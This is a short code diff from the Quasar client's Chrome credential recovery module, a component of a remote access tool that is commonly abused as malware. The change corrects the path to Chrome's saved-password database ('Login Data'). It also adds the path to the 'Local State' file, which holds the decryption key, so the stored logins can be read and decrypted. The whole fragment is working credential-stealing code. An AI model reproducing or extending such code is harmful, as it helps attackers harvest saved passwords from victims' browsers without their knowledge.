@@ -16,8 +16,10 @@ namespace Quasar.Client.Recovery.Browsers
             try
             {
                 string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
-                return ReadAccounts(filePath, ApplicationName);
+                    "..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
+                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    "..\\Local\\Google\\Chrome\\User Data\\Local State");
+                return ReadAccounts(filePath, localStatePath, ApplicationName);
             }
             catch (Exception)
             {
